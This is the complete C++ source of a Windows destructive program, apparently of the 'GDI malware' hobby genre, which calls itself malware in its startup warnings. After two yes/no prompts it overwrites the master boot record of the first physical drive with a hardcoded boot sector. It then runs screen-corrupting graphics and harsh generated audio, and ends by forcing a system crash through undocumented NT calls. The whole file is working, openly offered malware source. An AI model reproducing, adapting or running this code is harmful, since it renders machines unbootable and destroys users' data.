#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#define RGBBRUSH (DWORD)0x1900ac010e
#include <intrin.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

const unsigned char MasterBootRecord[] = {0xEB, 0x00, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0xF8, 0xFC, 0x0E, 0x17, 0x0E, 0x1F, 0x31, 0xC0, 0x31, 
0xDB, 0xB9, 0xFF, 0x00, 0xBE, 0x07, 0x7C, 0xBC, 0xFE, 0xFF, 0x89, 0xE7, 0x40, 0xCD, 0x10, 0xB8, 
0x00, 0xB8, 0x8E, 0xC0, 0x91, 0xB4, 0x2E, 0xF3, 0xAB, 0x56, 0xBE, 0x5C, 0x7D, 0xBA, 0x05, 0x01, 
0xE8, 0x32, 0x01, 0x91, 0xCD, 0x1A, 0x52, 0xBD, 0x30, 0x30, 0xBA, 0x11, 0x1C, 0xBB, 0x00, 0x1C, 
0x59, 0x5E, 0xAD, 0x01, 0xC8, 0x7A, 0x02, 0xB7, 0x28, 0x56, 0x50, 0x31, 0xC9, 0xE8, 0x2F, 0x01, 
0xE8, 0xA5, 0x00, 0x42, 0x42, 0xE8, 0x86, 0x00, 0x4A, 0x4A, 0xE8, 0x81, 0x00, 0x87, 0xDA, 0xB1, 
0x04, 0xE8, 0x7F, 0x00, 0xE8, 0x27, 0x01, 0x87, 0xDA, 0xF4, 0x38, 0xF7, 0x75, 0x2E, 0x52, 0x28, 
0xDA, 0xF6, 0xDA, 0x78, 0xFC, 0x80, 0xFA, 0x03, 0x5A, 0x7F, 0x21, 0xBE, 0x07, 0x7C, 0x81, 0xC5, 
0x00, 0x01, 0xB1, 0x26, 0x51, 0xB1, 0x04, 0xE8, 0x59, 0x00, 0xE8, 0x01, 0x01, 0x83, 0xEE, 0x25, 
0x59, 0xE2, 0xF1, 0x81, 0xFD, 0x00, 0x3A, 0x7C, 0xA1, 0xF9, 0xEB, 0x18, 0xEB, 0x2F, 0x80, 0xF6, 
0x34, 0x80, 0xFB, 0x20, 0x75, 0xAA, 0x4A, 0x80, 0xFA, 0x07, 0x7F, 0x91, 0x45, 0x95, 0x3C, 0x3A, 
0x95, 0x7C, 0x87, 0xF8, 0xBE, 0x62, 0x7D, 0xBA, 0x05, 0x03, 0x72, 0x02, 0xB2, 0x1E, 0x31, 0xDB, 
0xF9, 0xE8, 0xA1, 0x00, 0x31, 0xC0, 0xCD, 0x16, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0x43, 0xB4, 0x01, 
0xCD, 0x16, 0x74, 0xCD, 0x30, 0xE4, 0xCD, 0x16, 0x3C, 0x1B, 0x74, 0xEC, 0xEB, 0xC0, 0xBE, 0x20, 
0x7D, 0xB1, 0x02, 0x88, 0xF0, 0x98, 0x97, 0xB0, 0x50, 0xF6, 0xEA, 0x01, 0xC7, 0xA5, 0xA5, 0xA5, 
0xA5, 0xA5, 0x83, 0xC7, 0x46, 0xE2, 0xF6, 0xC3, 0xB1, 0x1A, 0x89, 0xCF, 0xB8, 0xDF, 0x74, 0xF6, 
0xC3, 0x01, 0x75, 0x02, 0xB0, 0xDC, 0xAB, 0x51, 0xF9, 0xB4, 0x00, 0xB1, 0x05, 0xF3, 0xAB, 0x73, 
0x06, 0xB4, 0x0F, 0xAB, 0xF5, 0xEB, 0xF2, 0xB4, 0x74, 0xAB, 0x83, 0xC7, 0x36, 0x59, 0xE2, 0xE6, 
0xC3, 0x00, 0xDE, 0x04, 0x7C, 0x4E, 0xDD, 0x04, 0x20, 0x07, 0xB2, 0x08, 0xC1, 0x0C, 0x1E, 0x4B, 
0xC1, 0x0C, 0xB2, 0x08, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x00, 
0x20, 0x00, 0x5C, 0x07, 0xDC, 0x07, 0x2F, 0x07, 0xFB, 0x07, 0xDB, 0x07, 0x7E, 0x70, 0x22, 0x74, 
0x40, 0x07, 0x20, 0x07, 0xB3, 0x70, 0x20, 0x08, 0xB3, 0x70, 0x20, 0x08, 0x53, 0x53, 0x41, 0x55, 
0x4F, 0x59, 0x4E, 0x4F, 0x57, 0xB4, 0x02, 0xCD, 0x10, 0xB1, 0x03, 0xAC, 0xB4, 0x0A, 0xCD, 0x10, 
0xE2, 0xF9, 0xB2, 0x1E, 0xF5, 0x72, 0xEE, 0xBA, 0x0F, 0x1A, 0xB4, 0x02, 0xCD, 0x10, 0xC3, 0x95, 
0xBF, 0xFC, 0x00, 0x86, 0xE0, 0xAA, 0x83, 0xC7, 0x31, 0x86, 0xC4, 0xAA, 0x95, 0xC3, 0x52, 0xB0, 
0xB6, 0xE6, 0x43, 0x88, 0xD0, 0xE6, 0x42, 0xD0, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6, 
0x61, 0xB6, 0x09, 0xE8, 0x15, 0x00, 0x29, 0xD0, 0x92, 0xE8, 0x0F, 0x00, 0x39, 0xD0, 0x7F, 0xF9, 
0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xE8, 0x0F, 0x00, 0x5A, 0xC3, 0x31, 0xC0, 0xE6, 0x43, 0xE4, 
0x40, 0x86, 0xE0, 0xE4, 0x40, 0x86, 0xE0, 0xC3, 0xBA, 0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 
0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
void mbr()
{    
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
DWORD WINAPI RGB2(LPVOID lpParam)
{
    HWND v3; 
    HBITMAP h; 
    HDC hdcSrc; 
    HDC hdc; 
    void* lpvBits;
    int nHeight; 
    int nWidth; 
    DWORD v12; 
    int j; 
    int v14; 
    int i; 
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Sleep(20);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI payload3(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
		Sleep(1);
	}
}
DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
 
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
 
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(25);
        }
    }
}
DWORD WINAPI textout(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"J100758.264+211529.207";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(10);
    }
}
DWORD WINAPI payload6(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>9|t>>13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t<<1)^((t<<1)+(t>>7)&t>>12))|t>>(4-(1^7&(t>>19)))|t>>7;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t>>(t/512));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t<<t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main(){
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"J100758.264+211529.207", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"J100758.264+211529.207", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	mbr();
        	HANDLE thread1 = CreateThread(0, 0, RGB2, 0, 0, 0);
        	sound1();
        	Sleep(30000);
        	TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
        	HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
        	HANDLE thread3 = CreateThread(0, 0, wef, 0, 0, 0);
        	sound2();
        	Sleep(30000);
        	TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
        	TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, payload3, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(2000);
        	HANDLE thread5 = CreateThread(0, 0, textout, 0, 0, 0);
        	HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
        	HANDLE thread7 = CreateThread(0, 0, wef, 0, 0, 0);
        	sound4();
        	Sleep(30000);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(0xC0000069, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
